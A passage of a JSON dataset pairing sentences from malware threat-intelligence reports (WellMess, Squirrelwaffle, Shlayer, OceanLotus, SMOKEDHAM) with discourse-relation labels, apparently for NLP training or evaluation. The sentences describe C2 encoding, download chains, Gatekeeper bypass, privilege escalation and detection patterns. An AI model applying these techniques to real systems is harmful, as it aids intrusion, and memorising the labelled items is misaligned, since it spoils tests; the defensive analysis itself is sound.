        "S1": "The WellMess malware stores the C2 IP addresses it uses in the binary as a plaintext url.",
        "S2": "This pattern can be used to identify numerous samples of the WellMess backdoor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The format of the C2 url string for the example in Figure 3 would be one of:",
        "S2": "Data is sent to the C2 by DNS tunnelling.",
        "relation": "MISC"
    },
    {
        "S1": "This pattern can be used to identify numerous samples of the WellMess backdoor.",
        "S2": "This time value is then used throughout the execution of the malware as part of the DNS beacon message to the C2.",
        "relation": "MISC"
    },
    {
        "S1": "The implementation of DNS tunnelling in this sample uses A records to send data to the C2 and then uses TXT records to receive commands during its main loop.",
        "S2": "As this sample did not have DNS functionality enabled, the key was not configured in this binary.",
        "relation": "MISC"
    },
    {
        "S1": "The initial message sent to the C2 consists of the current time printed in DD/MM/YYYY HH:MM:SS AM/PM format.",
        "S2": "This time value is then used throughout the execution of the malware as part of the DNS beacon message to the C2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is then encoded using a non-standard base32 encoding with an alphabet of ybndrfg8ejkmcpqxot1uwisza345h769.",
        "S2": "The result of the RC4 operation is then encoded using the base32 encoding and then that is split into a period-separated string with each chunk a random length.",
        "relation": "MISC"
    },
    {
        "S1": "This time value is then used throughout the execution of the malware as part of the DNS beacon message to the C2.",
        "S2": "The whole message is then prepended with a sequence identifier in case the malware needs more than one DNS request to fit the information in.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It then gzips and RC4 encrypts the previously generated MD5 hash string using a hardcoded key.",
        "S2": "The result of the RC4 operation is then encoded using the base32 encoding and then that is split into a period-separated string with each chunk a random length.",
        "relation": "NEXT"
    },
    {
        "S1": "The whole message is then prepended with a sequence identifier in case the malware needs more than one DNS request to fit the information in.",
        "S2": "When sending beacons during the main loop in DNS mode the malware will generate two base64 encoded strings from seven random bytes each and join them with a period to the command rc.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The whole message is then prepended with a sequence identifier in case the malware needs more than one DNS request to fit the information in.",
        "S2": "As can be seen in the above examples, even when the contents of the message change, the part of the URL relating to the MD5 hash remains consistent albeit with different length chunks for each send.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Finally, it will append another 10 base64 encoded strings, each generated from 7 random bytes.",
        "S2": "If the first command does not match either of these values then the malware reads the data from the third TXT record, decodes it using the custom base32 algorithm, RC4 decrypts the result, then gzip decompresses the data to give the final data to be used.",
        "relation": "MISC"
    },
    {
        "S1": "Finally the C2 domain is appended to the string and this is sent to the C2 as a DNS TXT request.",
        "S2": "The first specifies the command that is being sent from the C2 and can be either of C or G.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first specifies the command that is being sent from the C2 and can be either of C or G.",
        "S2": "If the first command does not match either of these values then the malware reads the data from the third TXT record, decodes it using the custom base32 algorithm, RC4 decrypts the result, then gzip decompresses the data to give the final data to be used.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the first command does not match either of these values then the malware reads the data from the third TXT record, decodes it using the custom base32 algorithm, RC4 decrypts the result, then gzip decompresses the data to give the final data to be used.",
        "S2": "The com option calls the same functions as the default case in the HTTP and HTTPS modes which allows the malware to run a cmd shell but then exfiltrates the output via DNS A records.",
        "relation": "MISC"
    },
    {
        "S1": "Squirrelwaffle campaigns generally start via spam emails that attempt to convince victims to click an embedded URL using a technique known as email thread hijacking.",
        "S2": "This VBS file contains an obfuscated PowerShell script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.",
        "relation": "NEXT"
    },
    {
        "S1": "This document is using a DocuSign template lure that instructs the user to enable a macro to view the content (as shown in Figure 2).",
        "S2": "Once the user enables the macro, an AutoOpen() subroutine is called which then executes a malicious Visual Basic Application (VBA) macro.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the user enables the macro, an AutoOpen() subroutine is called which then executes a malicious Visual Basic Application (VBA) macro.",
        "S2": "The document that contains the macro code leverages cscript.exe to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using wscript.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The document that contains the macro code leverages cscript.exe to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using wscript.exe.",
        "S2": "The payload is written to %ProgramData% with the filename ww1.dll.",
        "relation": "MISC"
    },
    {
        "S1": "This VBS file contains an obfuscated PowerShell script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.",
        "S2": "The VBS file simply uses the IEX (Invoke-Expression) function to download the Squirrelwaffle loader.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The payload is written to %ProgramData% with the filename ww1.dll.",
        "S2": "The payload DLL is executed via rundll32.exe by invoking the export function name ldr.",
        "relation": "NEXT"
    },
    {
        "S1": "The VBS file simply uses the IEX (Invoke-Expression) function to download the Squirrelwaffle loader.",
        "S2": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle are shown below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The payload DLL is executed via rundll32.exe by invoking the export function name ldr.",
        "S2": "Once the Squirrelwaffle payload is downloaded, it will either be executed via rundll32.exe or regsvr.exe depending upon the initial infection vector that was used to download the payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle are shown below:",
        "S2": "Recently, the initial infection vector has used hidden Microsoft Excel sheets with an Auto_Open() macro, which downloads the Squirrelwafle loader from three different URLs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor behind these campaigns has changed some of their TTPs over time.",
        "S2": "The threat actor also changed the location where the payload is written to disk.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Recently, the initial infection vector has used hidden Microsoft Excel sheets with an Auto_Open() macro, which downloads the Squirrelwafle loader from three different URLs.",
        "S2": "Once the Squirrelwaffle payload is downloaded, it will either be executed via rundll32.exe or regsvr.exe depending upon the initial infection vector that was used to download the payload.",
        "relation": "NEXT"
    },
    {
        "S1": "The Squirrelwaffle loader is subsequently executed via regsvr32.exe.",
        "S2": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle from this campaign are shown below:",
        "relation": "MISC"
    },
    {
        "S1": "An example for this campaign shown in Figure 6, used a Microsoft Excel document with the MD5 hash 77BD39191FDC817F2F14F0462BFF8D86 and a filename matching the regular expression diagram-\\d{1,9}.xls.",
        "S2": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle from this campaign are shown below:",
        "relation": "NEXT"
    },
    {
        "S1": "The Squirrelwaffle loader is a 32-bit DLL, which is packed with a custom packer.",
        "S2": "Squirrelwaffle contains a hardcoded configuration that is encrypted in the binary.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Squirrelwaffle contains a hardcoded configuration that is encrypted in the binary.",
        "S2": "An example formatted Squirrelwaffle configuration is shown in Figure 10.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The path of the HTTP POST request consists of a hardcoded prefix and a Base64 encoded string that is encrypted using the same XOR-based algorithm and key as described above.",
        "S2": "This payload is also encrypted with the same XOR-based algorithm and key as the HTTP POST path component.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This encoded string includes an alphanumeric string with a random length between 1 and 28 characters followed by the IP address of the system.",
        "S2": "These fields include a status code, a timestamp, the external IP address of the system, along with the victim\u2019s system information that was previously sent.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The HTTP POST body contains another Base64 encoded string that includes the victim\u2019s computer name, username, application data directory, and workgroup.",
        "S2": "These fields include a status code, a timestamp, the external IP address of the system, along with the victim\u2019s system information that was previously sent.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The SquirrelWaffle CnC responds with a Base64 encoded payload that uses the same encryption schema with another format that uses two tab characters as delimiter between fields.",
        "S2": "The SquirrelWaffle CnC response may also contain a second-stage payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The SquirrelWaffle CnC response may also contain a second-stage payload.",
        "S2": "This second-stage payload will be written to a filename that consists of eleven random alphanumeric characters appended with a .txt extension, and then executed by SquirrelWaffle.",
        "relation": "NEXT"
    },
    {
        "S1": "This file is packed and decrypted in memory to produce a Cobalt Strike stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C, which further downloads the Cobalt Strike beacon.",
        "S2": "The Cobalt Strike CnC server responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in Figure 12.",
        "relation": "NEXT"
    },
    {
        "S1": "The Cobalt Strike CnC server responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in Figure 12.",
        "S2": "The Cobalt Strike beacon observed by Zscaler ThreatLabz contains the following CnC servers:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Whether you receive the malware or a generic advertisement from the compromised domain depends on your browser\u2019s user-agent string, IP address, and relative last visit.",
        "S2": "To this point, all discovered samples of this malware have targeted only macOS.",
        "relation": "MISC"
    },
    {
        "S1": "Given this determination, TAU developed a script to rotate through proxies, visit the main advertisement domain (in this example case, dubbeldachs[.]com), follow through all redirects, detect if the site is malicious or not, capture a screenshot + page source + malware payload, and categorize the data.",
        "S2": "Samples discovered by TAU have been seen to affect versions of macOS from 10.10.5 to 10.14.3 as of December 2019.",
        "relation": "MISC"
    },
    {
        "S1": "Running this script across multiple systems, we were able to capture over 50 unique samples in a matter of hours, all targeted towards macOS.",
        "S2": "Although the distribution sites vary in theme and delivery method, we observed the resulting payload ultimately installed a variant of Shlayer.",
        "relation": "NEXT"
    },
    {
        "S1": "Running this script across multiple systems, we were able to capture over 50 unique samples in a matter of hours, all targeted towards macOS.",
        "S2": "Samples discovered by TAU have been seen to affect versions of macOS from 10.10.5 to 10.14.3 as of December 2019.",
        "relation": "NEXT"
    },
    {
        "S1": "The following screenshot illustrates a sample delivery site typical of Shlayer (and other adware):",
        "S2": "Although the distribution sites vary in theme and delivery method, we observed the resulting payload ultimately installed a variant of Shlayer.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Although the distribution sites vary in theme and delivery method, we observed the resulting payload ultimately installed a variant of Shlayer.",
        "S2": "However, unlike files downloaded from a web browser, when a file is downloaded via the command line utility curl, the quarantine attribute flag required for Gatekeeper\u2019s check is not added to the file.",
        "relation": "MISC"
    },
    {
        "S1": "Although the distribution sites vary in theme and delivery method, we observed the resulting payload ultimately installed a variant of Shlayer.",
        "S2": "Although most samples were DMG files, we also discovered .pkg, .iso, and .zip payloads.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Samples discovered by TAU have been seen to affect versions of macOS from 10.10.5 to 10.14.3 as of December 2019.",
        "S2": "Note: There are many other samples found by TAU that appear to be variations of this malware, masquerading as pirated software \u2013 these variations may have different application paths.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To this point, all discovered samples of this malware have targeted only macOS.",
        "S2": "Many of the initial DMGs are signed with a legitimate Apple developer ID and use legitimate system applications via bash to conduct all installation activities.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware employs multiple levels of obfuscation and is capable of privilege escalation.",
        "S2": "Note: There are many other samples found by TAU that appear to be variations of this malware, masquerading as pirated software \u2013 these variations may have different application paths.",
        "relation": "MISC"
    },
    {
        "S1": "Many of the initial DMGs are signed with a legitimate Apple developer ID and use legitimate system applications via bash to conduct all installation activities.",
        "S2": "- Collects system information such as the macOS version and IOPlatformUUID (a unique identifier for the system)",
        "relation": "NEXT"
    },
    {
        "S1": "Although most samples were DMG files, we also discovered .pkg, .iso, and .zip payloads.",
        "S2": "Since the time of our first reporting earlier last year however, Apple introduced additional security measures to both the registration of developer IDs as well as the execution of kernel extensions.",
        "relation": "MISC"
    },
    {
        "S1": "Note: There are many other samples found by TAU that appear to be variations of this malware, masquerading as pirated software \u2013 these variations may have different application paths.",
        "S2": "Due to the number of known IOCs for this malware",
        "relation": "MISC"
    },
    {
        "S1": "The samples collected and analyzed by TAU that were derived from pirated software have a nearly identical execution chain as the traditional samples described below, with the exception of the command-line arguments to the curl command: curl -f0L versus curl -fsL.",
        "S2": "For more information on how Carbon Black\u2019s products protect from these threats, please see the Shlayer TAU-TIN on our user exchange.",
        "relation": "MISC"
    },
    {
        "S1": "As referenced in the Delivery section above, many Shlayer infections are distributed as fake Adobe Flash Player updates from a compromised site, often packaged as a DMG file.",
        "S2": "Because this is a valid developer certificate issued by Apple, Gatekeeper will allow this software to run without prompt.",
        "relation": "NEXT"
    },
    {
        "S1": "The downloaded installer is designed to look like a legitimate installation to trick the user into authenticating with their password to continue the second stage infection such as the screenshot below:",
        "S2": "The decoded script in Figure 4 above represents the final steps of the first stage of this infection, performing the following after identifying the script location (e.g. /Volumes/Player/.hidden) and performing a verification check:",
        "relation": "MISC"
    },
    {
        "S1": "This script base64 decodes and AES decrypts a second script containing an additional encoded script that is subsequently executed.",
        "S2": "The second script below uses the system utilities xxd and base64 to decode a third script which ultimately performs the download of the second stage payload and initializes the final installation activity.",
        "relation": "NEXT"
    },
    {
        "S1": "The second script below uses the system utilities xxd and base64 to decode a third script which ultimately performs the download of the second stage payload and initializes the final installation activity.",
        "S2": "- Creates a custom URL using the information generated in the previous two steps and downloads the second stage payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Collects system information such as the macOS version and IOPlatformUUID (a unique identifier for the system)",
        "S2": "Apple Developer IDs are used to digitally sign applications with a certificate which is used by Gatekeeper on macOS as a first step in validation of a binary for safety.",
        "relation": "MISC"
    },
    {
        "S1": "- Creates a custom URL using the information generated in the previous two steps and downloads the second stage payload.",
        "S2": "- Attempts to download the zip file payload using curl (with arguments of either \u201c-f0L\u201d or \u201c\u2013fsL\u201d as mentioned above)",
        "relation": "NEXT"
    },
    {
        "S1": "- Creates a directory in /tmp to store the payload and unzips the password-protected payload (note: the zip password is hardcoded in the script per sample)",
        "S2": "- Executes the payload using open with the passed arguments \u201cs\u201d \u201c$session_guid\u201d and \u201c$volume_name\u201d as in the example below: open -a /tmp/dTpyJRei/Player.app \u2013args s 141CE8F5-BA78-4EA8-A941-933A076BA0EN /Volumes/Player/",
        "relation": "NEXT"
    },
    {
        "S1": "- Executes the payload using open with the passed arguments \u201cs\u201d \u201c$session_guid\u201d and \u201c$volume_name\u201d as in the example below: open -a /tmp/dTpyJRei/Player.app \u2013args s 141CE8F5-BA78-4EA8-A941-933A076BA0EN /Volumes/Player/",
        "S2": "After the second stage payload is downloaded and executed, it attempts to escalate privileges with sudo using a technique invoking /usr/libexec/security_authtrampoline as discussed in Patrick Wardle\u2019s DEFCON 2017 talk \u201cDeath by 1000 Installers\u201d and now documented under MITRE ATT&CK TID 1514 (Elevated Execution with Prompt)1.",
        "relation": "NEXT"
    },
    {
        "S1": "This allows the allowlisted software to run without user intervention even if the system is set to disallow unknown applications downloaded from the internet.",
        "S2": "When a program is downloaded from the internet, Gatekeeper runs a check to see if the if the package or application is signed, and if it is signed with a known and trusted developer ID.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Apple Developer IDs are used to digitally sign applications with a certificate which is used by Gatekeeper on macOS as a first step in validation of a binary for safety.",
        "S2": "If we examine one of the first stage Shlayer DMG packages, we can see that the initial executable that is launched by the installer is signed by a valid Apple Developer ID (in the case illustrated below, Brianna Sanchez).",
        "relation": "ELABORATION"
    },
    {
        "S1": "When a program is downloaded from the internet, Gatekeeper runs a check to see if the if the package or application is signed, and if it is signed with a known and trusted developer ID.",
        "S2": "Because this is a valid developer certificate issued by Apple, Gatekeeper will allow this software to run without prompt.",
        "relation": "NEXT"
    },
    {
        "S1": "When a program is downloaded from the internet, Gatekeeper runs a check to see if the if the package or application is signed, and if it is signed with a known and trusted developer ID.",
        "S2": "As of this writing, TAU has not discovered any samples of Shlayer that have been notarized, and it is highly unlikely we will be given the stringent build requirements under the new system.",
        "relation": "MISC"
    },
    {
        "S1": "Because this is a valid developer certificate issued by Apple, Gatekeeper will allow this software to run without prompt.",
        "S2": "During our initial tracking of Shlayer, we started to run down all the \u201cfake\u201d developer IDs but soon realized that they were clearly being randomly generated and at a surprising rate \u2013 below is a very small sample out of many of the initial IDs we collected:",
        "relation": "MISC"
    },
    {
        "S1": "Since the time of our first reporting earlier last year however, Apple introduced additional security measures to both the registration of developer IDs as well as the execution of kernel extensions.",
        "S2": "During our initial tracking of Shlayer, we started to run down all the \u201cfake\u201d developer IDs but soon realized that they were clearly being randomly generated and at a surprising rate \u2013 below is a very small sample out of many of the initial IDs we collected:",
        "relation": "MISC"
    },
    {
        "S1": "This is significant as Apple\u2019s form of two-factor authentication varies from typical 2FA systems which just require a verification code from an email or SMS message.",
        "S2": "Newer samples of Shlayer have been observed to perform a check for the validity of the Apple signature using spctl before execution of the final payload.",
        "relation": "MISC"
    },
    {
        "S1": "During our initial tracking of Shlayer, we started to run down all the \u201cfake\u201d developer IDs but soon realized that they were clearly being randomly generated and at a surprising rate \u2013 below is a very small sample out of many of the initial IDs we collected:",
        "S2": "This allows the script above to download, unzip, and execute the Shlayer application without warning, bypassing Gatekeeper.",
        "relation": "MISC"
    },
    {
        "S1": "During our initial tracking of Shlayer, we started to run down all the \u201cfake\u201d developer IDs but soon realized that they were clearly being randomly generated and at a surprising rate \u2013 below is a very small sample out of many of the initial IDs we collected:",
        "S2": "Because of this, we recommend detection and monitoring strategies based around behavioral indicators rather than hash- or other IOC-based indicators.",
        "relation": "MISC"
    },
    {
        "S1": "This allows the script above to download, unzip, and execute the Shlayer application without warning, bypassing Gatekeeper.",
        "S2": "Newer samples of Shlayer have been observed to perform a check for the validity of the Apple signature using spctl before execution of the final payload.",
        "relation": "MISC"
    },
    {
        "S1": "This allows the script above to download, unzip, and execute the Shlayer application without warning, bypassing Gatekeeper.",
        "S2": "If the signature has been revoked, the software will exit regardless of whether Gatekeeper has been successfully bypassed.",
        "relation": "MISC"
    },
    {
        "S1": "Newer samples of Shlayer have been observed to perform a check for the validity of the Apple signature using spctl before execution of the final payload.",
        "S2": "Apple has been revoking these falsely created certificates for Shlayer and other common malware quickly, cutting their effective time in the wild as legitimate applications very short.",
        "relation": "MISC"
    },
    {
        "S1": "Apple has been revoking these falsely created certificates for Shlayer and other common malware quickly, cutting their effective time in the wild as legitimate applications very short.",
        "S2": "As of this writing, TAU has not discovered any samples of Shlayer that have been notarized, and it is highly unlikely we will be given the stringent build requirements under the new system.",
        "relation": "MISC"
    },
    {
        "S1": "As of this writing, TAU has not discovered any samples of Shlayer that have been notarized, and it is highly unlikely we will be given the stringent build requirements under the new system.",
        "S2": "For example, the execution of system utilities xxd, base64, openssl, curl, and unzip may be common in a typical development environment in isolation, but when seen in succession indicate Shlayer installation activity with high fidelity in our observation.",
        "relation": "MISC"
    },
    {
        "S1": "Due to the number of known IOCs for this malware",
        "S2": "Despite these changes however, the ability to detect the early-stage behavioral indicators of this malware can easily prevent infection and protect the organization.",
        "relation": "MISC"
    },
    {
        "S1": "For example, the execution of system utilities xxd, base64, openssl, curl, and unzip may be common in a typical development environment in isolation, but when seen in succession indicate Shlayer installation activity with high fidelity in our observation.",
        "S2": "For more information on how Carbon Black\u2019s products protect from these threats, please see the Shlayer TAU-TIN on our user exchange.",
        "relation": "MISC"
    },
    {
        "S1": "For example, the execution of system utilities xxd, base64, openssl, curl, and unzip may be common in a typical development environment in isolation, but when seen in succession indicate Shlayer installation activity with high fidelity in our observation.",
        "S2": "This illustrates the true danger of Shlayer: although it is considered Adware, and therefore often dismissed as a lower threat, successful infections of this malware result in the entrenchment of a backdoor that allows for the installation of any software as the root user.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For example, the execution of system utilities xxd, base64, openssl, curl, and unzip may be common in a typical development environment in isolation, but when seen in succession indicate Shlayer installation activity with high fidelity in our observation.",
        "S2": "After the second stage malware downloaded by curl has been entrenched and gained root access, it is able to then download and install additional software as seen in the process tree below:",
        "relation": "NEXT"
    },
    {
        "S1": "It uses the icon for a Word document file as a disguise, attempting to pass itself off as a legitimate document file.",
        "S2": "Otherwise, if the postfix is .doc without special characters, Microsoft Word is called to open the app bundle as a document; but since it is not a valid document, the app fails to open it.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "Another technique it uses to evade detection is adding special characters to its app bundle name.",
        "S2": "The operating system sees the app bundle as an unsupported directory type, so as a default action the \u201copen\u201d command is used to execute the malicious app.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When a user looks for the fake doc folder via the macOS Finder app or the terminal command line, the folder's name shows \"ALL tim nha Chi Ngoc Canada.doc\" (\u201ct\u00ecm nh\u00e0 Ch\u1ecb Ng\u1ecdc\u201d roughly translates to \u201cfind Mrs. Ngoc\u2019s house\u201d).",
        "S2": "- ALL tim nha Chi Ngoc Canada: The shell script containing the main malicious routines",
        "relation": "ELABORATION"
    },
    {
        "S1": "Otherwise, if the postfix is .doc without special characters, Microsoft Word is called to open the app bundle as a document; but since it is not a valid document, the app fails to open it.",
        "S2": "The app bundle contains two notable files:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Otherwise, if the postfix is .doc without special characters, Microsoft Word is called to open the app bundle as a document; but since it is not a valid document, the app fails to open it.",
        "S2": "Like older versions of the OceanLotus backdoor, the new version contains two main functions: one for collecting operating system information and submitting this to its malicious C&C servers and receiving additional C&C communication information, and another for the backdoor capabilities.",
        "relation": "MISC"
    },
    {
        "S1": "Here is the code signing information for the app bundle sample.",
        "S2": "Like older versions of the OceanLotus backdoor, the new version contains two main functions: one for collecting operating system information and submitting this to its malicious C&C servers and receiving additional C&C communication information, and another for the backdoor capabilities.",
        "relation": "MISC"
    },
    {
        "S1": "- Change access permission of second-stage payload to execute the launch of the second-stage payload",
        "S2": "When executed, the second stage payload (ALL tim nha Chi Ngoc Canada.?doc/Contents/Resources/configureDefault.def) performs the following malware routines:",
        "relation": "NEXT"
    },
    {
        "S1": "Like older versions of the OceanLotus backdoor, the new version contains two main functions: one for collecting operating system information and submitting this to its malicious C&C servers and receiving additional C&C communication information, and another for the backdoor capabilities.",
        "S2": "The new variant\u2019s backdoor capabilities are similar to those of the old OceanLotus sample, as detailed in the code excerpts below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Like older versions of the OceanLotus backdoor, the new version contains two main functions: one for collecting operating system information and submitting this to its malicious C&C servers and receiving additional C&C communication information, and another for the backdoor capabilities.",
        "S2": "Here are the C&C servers used by the malware:",
        "relation": "MISC"
    },
    {
        "S1": "It collects the following information from the infected system by invoking the following commands:",
        "S2": "It also receives commands from the same server.",
        "relation": "NEXT"
    },
    {
        "S1": "It also receives commands from the same server.",
        "S2": "The new variant\u2019s backdoor capabilities are similar to those of the old OceanLotus sample, as detailed in the code excerpts below:",
        "relation": "MISC"
    },
    {
        "S1": "Mandiant Consulting observed the Trojanized installer downloaded on a Windows workstation after the user visited a legitimate site that the victim organization had used before.",
        "S2": "Mandiant confirmed the user intended to download, install, and use the SmartPSS software.",
        "relation": "NEXT"
    },
    {
        "S1": "Mandiant Consulting observed the Trojanized installer downloaded on a Windows workstation after the user visited a legitimate site that the victim organization had used before.",
        "S2": "The following commands were used to create and add the DefaultUser account to the local Administrators group, and subsequently hide the account from the Windows logon screen.",
        "relation": "MISC"
    },
    {
        "S1": "Mandiant confirmed the user intended to download, install, and use the SmartPSS software.",
        "S2": "Domain sdoc[.]xyz was first associated with UNC2465 by RiskIQ in a May 20, 2021, blog post researching the infrastructure that Mandiant previously reported.",
        "relation": "MISC"
    },
    {
        "S1": "Figure 2 shows an image of the download page used for SmartPSS software.",
        "S2": "The former is a clean installer from the original developer and is launched first, installing the software as the user may expect.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The former is a clean installer from the original developer and is launched first, installing the software as the user may expect.",
        "S2": "NGROK is a publicly available utility that can expose local servers behind NATs and firewalls to the public internet over secure tunnels.",
        "relation": "MISC"
    },
    {
        "S1": "Disassembly analysis of the program showed it was a small application that loaded the IE COM object and launched the function RunHTMLApplication() against the command line argument provided.",
        "S2": "Further analysis showed that the malware was based on a 2018 version of the binary (original hash: 5ced5d5b469724d9992f5e8117ecefb5) with only six bytes of data appended, as shown in Figure 4.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Domain sdoc[.]xyz was first associated with UNC2465 by RiskIQ in a May 20, 2021, blog post researching the infrastructure that Mandiant previously reported.",
        "S2": "Mandiant was not able to acquire this file at the time of writing; however, Mandiant was able to recover partial contents of the file.",
        "relation": "MISC"
    },
    {
        "S1": "Mandiant was not able to acquire this file at the time of writing; however, Mandiant was able to recover partial contents of the file.",
        "S2": "Mandiant was not able to recover this file at the time of writing; however, Mandiant was able to recover partial contents of the file.",
        "relation": "MISC"
    },
    {
        "S1": "Shortly after the download, a PowerShell script block was executed to download SMOKEDHAM, as shown in Figure 6.",
        "S2": "After the execution of qnxfhfim.cmdline, PowerShell initiated the first connection to the fronted domain lumiahelptipsmscdnqa[.]microsoft[.]com used by SMOKEDHAM.",
        "relation": "NEXT"
    },
    {
        "S1": "Mandiant was not able to recover this file at the time of writing; however, Mandiant was able to recover partial contents of the file.",
        "S2": "Mandiant observed the fronted domain lumiahelptipsmscdnqa.microsoft[.]com and hard-coded domain max-ghoster1.azureedge[.]net used for C2 server communication.",
        "relation": "MISC"
    },
    {
        "S1": "The SMOKEDHAM dropper (f075c2894ac84df4805e8ccf6491a4f4) is written in PowerShell and decrypts and executes in memory the SMOKEDHAM backdoor.",
        "S2": "In this case, the dropper uses SMOKEDHAM backdoor source code that is stored in a variable.",
        "relation": "NEXT"
    },
    {
        "S1": "The SMOKEDHAM dropper (f075c2894ac84df4805e8ccf6491a4f4) is written in PowerShell and decrypts and executes in memory the SMOKEDHAM backdoor.",
        "S2": "If the plaintext command data does not begin with any of the keywords listed in Table 1, then SMOKEDHAM assumes the data contains a PowerShell command and attempts to execute it.",
        "relation": "MISC"
    },
    {
        "S1": "The dropper uses the Add-Type cmdlet to define a new .NET class for the backdoor.",
        "S2": "After defining a new .NET class for the backdoor, the dropper executes the backdoor's entry point.",
        "relation": "NEXT"
    },
    {
        "S1": "The dropper uses the Add-Type cmdlet to define a new .NET class for the backdoor.",
        "S2": "In this case, the dropper uses SMOKEDHAM backdoor source code that is stored in a variable.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Add-Type cmdlet can be used to define a new .NET class using an existing assembly or source code files or specifying source code inline or saved in a variable.",
        "S2": "After defining a new .NET class for the backdoor, the dropper executes the backdoor's entry point.",
        "relation": "NEXT"
    },
    {
        "S1": "The Add-Type cmdlet can be used to define a new .NET class using an existing assembly or source code files or specifying source code inline or saved in a variable.",
        "S2": "The dropper uses the ConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the Add-Type cmdlet.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this case, the dropper uses SMOKEDHAM backdoor source code that is stored in a variable.",
        "S2": "The dropper uses the ConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the Add-Type cmdlet.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The SMOKEDHAM backdoor source code is embedded as an encrypted string.",
        "S2": "Figure 7 shows the deobfuscated SMOKEDHAM dropper.",
        "relation": "MISC"
    },
    {
        "S1": "The dropper uses the ConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the Add-Type cmdlet.",
        "S2": "The execution of VirtualHost.vbs allowed NGROK to listen and forward traffic on TCP port 6300 through an NGROK tunnel, subsequently allowing NGROK to tunnel UltraVNC traffic out of the environment.",
        "relation": "MISC"
    },
    {
        "S1": "The dropper uses the ConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the Add-Type cmdlet.",
        "S2": "The backdoor checks if the plaintext command data begins with one of the following keywords, shown in Table 1.",
        "relation": "MISC"
    },
    {
        "S1": "The dropper configures the backdoor with a C2 server address, RC4 encryption key, and sleep interval.",
        "S2": "The backdoor may also download and execute additional PowerShell commands from its command and control (C2) server.",
        "relation": "NEXT"
    },
    {
        "S1": "SMOKEDHAM (127bf1d43313736c52172f8dc6513f56) is a .NET-based backdoor that supports commands, including screen capture and keystroke capture.",
        "S2": "SMOKEDHAM communicates with its C2 server using HTTPS.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The backdoor may also download and execute additional PowerShell commands from its command and control (C2) server.",
        "S2": "The backdoor uses domain fronting to obfuscate its true C2 server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "SMOKEDHAM communicates with its C2 server using HTTPS.",
        "S2": "The communication between SMOKEDHAM and its C2 server consists of JSON data exchanged via HTTP POST requests.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The fronted domain is configured by an earlier stage of execution and the actual domain is hard-coded in the backdoor.",
        "S2": "The backdoor initiates requests to the C2 server and the C2 server may include commands to execute in the responses.",
        "relation": "NEXT"
    },
    {
        "S1": "Mandiant observed the fronted domain lumiahelptipsmscdnqa.microsoft[.]com and hard-coded domain max-ghoster1.azureedge[.]net used for C2 server communication.",
        "S2": "Mandiant observed the RC4 key UwOdHsFXjdCOIrjTCfnblwEZ used for RC4 encryption and decryption.",
        "relation": "MISC"
    },
    {
        "S1": "The communication between SMOKEDHAM and its C2 server consists of JSON data exchanged via HTTP POST requests.",
        "S2": "The JSON data exchanged between SMOKEDHAM and its C2 server contains three fields: ID, UUID, and Data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The backdoor initiates requests to the C2 server and the C2 server may include commands to execute in the responses.",
        "S2": "The ID field contains a unique value generated by the backdoor for the target system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The JSON data exchanged between SMOKEDHAM and its C2 server contains three fields: ID, UUID, and Data.",
        "S2": "When the C2 server responds with a command to execute, it sets the UUID field to a unique value.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The JSON data exchanged between SMOKEDHAM and its C2 server contains three fields: ID, UUID, and Data.",
        "S2": "SMOKEDHAM then sets the same UUID value in the subsequent HTTP POST request that contains the command output.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The ID field contains a unique value generated by the backdoor for the target system.",
